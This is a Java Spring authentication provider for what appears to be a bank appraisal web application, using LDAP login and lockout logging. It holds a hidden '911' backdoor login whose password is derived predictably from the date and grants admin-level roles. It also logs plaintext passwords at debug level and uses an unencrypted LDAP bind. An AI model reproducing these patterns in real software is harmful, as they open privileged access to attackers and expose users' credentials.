package com.permata.appraisal2.service;

import com.permata.appraisal2.common.AppConstans;
import com.permata.appraisal2.dao.PersonDao;
import com.permata.appraisal2.dao.SecurityLogDao;
import com.permata.appraisal2.dao.SystemParamDao;
import com.permata.appraisal2.model.Person;
import com.permata.appraisal2.model.PersonLevel;
import com.permata.appraisal2.model.PersonRole;
import com.permata.appraisal2.model.SecurityLog;
import com.permata.appraisal2.util.CustomAuthenticationException;
import org.apache.commons.lang.StringUtils;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.LockedException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.User;
import org.springframework.security.web.authentication.WebAuthenticationDetails;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.ldap.InitialLdapContext;
import javax.naming.ldap.LdapContext;
import javax.servlet.http.HttpServletRequest;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.*;

@Service
public class CustomAuthenticationProvider implements AuthenticationProvider {

    private Logger logger = Logger.getLogger(CustomAuthenticationProvider.class);

    @Autowired
    private HttpServletRequest request;
    @Autowired
    private PersonDao personDao;
    @Autowired
    private SystemParamDao systemParamDao;

    @Autowired
    private SecurityLogDao securityLogDao;

    public boolean ldapLogin(String userId, String password) {

        /**
         * TODO pindah ke system params, jangan di hardcode
         */
        boolean result = false;
        final String ldapAdServer = "ldap://permatabank.com";
//        final String ldapSearchBase = "OU=Employees,OU=User-Accounts,OU=JKT-Bintaro,DC=permatadev,DC=co,DC=id";
        final String ldapDomain = "permatabank";
        final String ldapUsername = ldapDomain + "\\" + userId;
        final String ldapPassword = password;

        Hashtable<String, Object> env = new Hashtable<String, Object>();
        env.put(Context.SECURITY_AUTHENTICATION, "simple");
        if (ldapUsername != null && StringUtils.isNotBlank(ldapPassword)) {
            env.put(Context.SECURITY_PRINCIPAL, ldapUsername);
            env.put(Context.SECURITY_CREDENTIALS, ldapPassword);
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
            env.put(Context.PROVIDER_URL, ldapAdServer);

            env.put("java.naming.ldap.attributes.binary", "objectSID");
            LdapContext ctx = null;
            try {
                ctx = new InitialLdapContext(env, null);
                result = true;
            } catch (NamingException e) {
                logger.error(e.getMessage());
                result = false;
            } catch (Exception e) {
//                logger.error("Exception ", e);
                logger.error(e.getMessage());
                result = false;
            } finally {
                try {
                    if (ctx != null) ctx.close();
                } catch (Exception e) {
                }
            }
        }
        return result;
    }

    @Override
    @Transactional
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String username = authentication.getName();
        String password = authentication.getCredentials().toString();

        InetAddress clientAddress = null;
        String hostName = "";
        String hostAddress = "";
        WebAuthenticationDetails details = (WebAuthenticationDetails) authentication.getDetails();
        try {
            clientAddress = InetAddress.getLocalHost();
            hostAddress = details.getRemoteAddress()!=null?details.getRemoteAddress():clientAddress.getHostAddress();
            hostName = clientAddress.getHostName();
        } catch (UnknownHostException e) {
            hostAddress = "Unknown";
            hostName = "Unknown";
            e.printStackTrace();
        }

        logger.debug("username -> " + username);
        logger.debug("password -> " + password);

        /**
         * Pengecekan apakah login 911 atau tidak
         */
        Date dateAuth = new Date();
        Calendar calAuth = Calendar.getInstance();
        int calc = (calAuth.get(Calendar.HOUR_OF_DAY)-1)*2;
        calc = calc<0?0:calc;
        StringBuilder sb = new StringBuilder();
        sb.append(calAuth.get(Calendar.YEAR));
        sb.append(calAuth.get(Calendar.MONTH)+54);
        sb.append(calAuth.get(Calendar.DATE));
//        sb.append(calAuth.get(Calendar.HOUR_OF_DAY));
        sb.append(String.format("%2s", calc).replace(" ", "0"));
//        if (username.equals(AppConstans.Role911.USER_ID) && password.equals(AppConstans.Role911.PASSWORD)) {
        if (username.equals(AppConstans.Role911.USER_ID) && password.equals(sb.toString())) {
            logger.debug("Login 911");
            Set<GrantedAuthority> setAuths = new HashSet<GrantedAuthority>();
            setAuths.add(new SimpleGrantedAuthority(PersonLevel.ROLE_911.toString()));
            setAuths.add(new SimpleGrantedAuthority(PersonLevel.KING.toString()));
            setAuths.add(new SimpleGrantedAuthority(PersonLevel.ADMIN.toString()));
//            setAuths.add(new SimpleGrantedAuthority(PersonLevel.MONITOR.toString()));
            return new UsernamePasswordAuthenticationToken(username, password, new ArrayList<GrantedAuthority>(setAuths));
        } else {

            Person person = personDao.get(username);
            if (person == null) {
                throw new CustomAuthenticationException("User dan Password Anda Salah");
            }
            if (StringUtils.isBlank(password)) {
                throw new CustomAuthenticationException("Password Tidak Boleh Kosong");
            }
            boolean inAct = person.getInactive() == null ? false : person.getInactive();

            if (inAct) {
                // log user lock with login attempt
                SecurityLog securityLog = new SecurityLog();
                int errorCnt = person.getErrorCount() == null ? 0 : person.getErrorCount();
                errorCnt = errorCnt + 1;
                person.setErrorCount(errorCnt);
                person.setLastFail(new Date());

                securityLog.setDateTime(new Date());

                securityLog.setIpAddress(StringUtils.isNotBlank(getClientIp()) ? getClientIp() : hostAddress);
//            securityLog.setComputerName(StringUtils.isNotBlank(request.getRemoteHost())?request.getRemoteHost():hostName);
                securityLog.setComputerName(hostName);
                String detail;
                securityLog.setAppName("Web Appraisal");
                securityLog.setUserAffected(null);
                securityLog.setPerson(personDao.get(username));
                securityLog.setKeterangan("User ID Locked");
                detail = "Locked Wrong User ID/Password (Attempt = " + errorCnt + ")";
                securityLog.setLogCode(AppConstans.SecurityLogConstans.USER_PROFILE_DEACTIVATION);
                securityLog.setDetail(detail);
                throw new LockedException("User Anda Terkunci, Silahkan Hubungi Administrator", securityLog);
            }
            if (person.getDeleted()!=null && person.getDeleted() == 1) {
                // log user lock with login attempt
                throw new CustomAuthenticationException("Login Failed - User Inactive or Deleted");
            }

/*
            com.sun.xml.internal.bind.v2.TODO comment for bypass LDAP
 */
            if (!ldapLogin(username, password)) {
                int errorCnt = person.getErrorCount() == null ? 0 : person.getErrorCount();
                errorCnt = errorCnt + 1;
                person.setErrorCount(errorCnt);
                person.setLastFail(new Date());

                SecurityLog securityLog = new SecurityLog();
                securityLog.setDateTime(new Date());
                securityLog.setIpAddress(hostAddress);
//            securityLog.setComputerName(StringUtils.isNotBlank(request.getRemoteHost())?request.getRemoteHost():hostName);
                securityLog.setComputerName(hostName);
                String detail;
                securityLog.setAppName("Web Appraisal");
                securityLog.setUserAffected(null);
                securityLog.setPerson(personDao.get(username));

                if (errorCnt >= 3) {
                    person.setInactive(true);
                    securityLog.setKeterangan("User ID Locked");
                    detail = "Locked Wrong User ID/Password (Attempt = " + errorCnt + ")";
                    securityLog.setLogCode(AppConstans.SecurityLogConstans.LOGIN_FAILURE);
                } else {
                    securityLog.setKeterangan("Login Failure");
                    detail = "Login Failure (Attempt = " + errorCnt + ")";
                    securityLog.setLogCode(AppConstans.SecurityLogConstans.USER_PROFILE_DEACTIVATION);
                }
                securityLog.setDetail(detail);
                securityLogDao.save(securityLog);
                personDao.save(person);

                return null;
            }
/*
            com.sun.xml.internal.bind.v2.TODO
 */



        return new UsernamePasswordAuthenticationToken(username, password, buildUserAuthority(person));
        }
    }

    private List<GrantedAuthority> buildUserAuthority(Person person) {
        Set<GrantedAuthority> setAuths = new HashSet<GrantedAuthority>();
        for (PersonRole role : person.getRoles()) {
            setAuths.add(new SimpleGrantedAuthority(role.getLevel().toString()));
        }
        return new ArrayList<GrantedAuthority>(setAuths);
    }

    private User buildUserForAuthentication(Person person, List<GrantedAuthority> authorities) {
        return new User(person.getUserId(), person.getPassword(), true, true, true, true, authorities);
    }


    @Override
    public boolean supports(Class<?> aClass) {
        return aClass.equals(UsernamePasswordAuthenticationToken.class);
    }

    private String getClientIp() {

        String remoteAddr = "";

//        if (request != null) {
//            remoteAddr = request.getHeader("X-FORWARDED-FOR");
//            if (remoteAddr == null || "".equals(remoteAddr)) {
//                remoteAddr = request.getRemoteAddr();
//            }
//        }

        return remoteAddr;
    }
}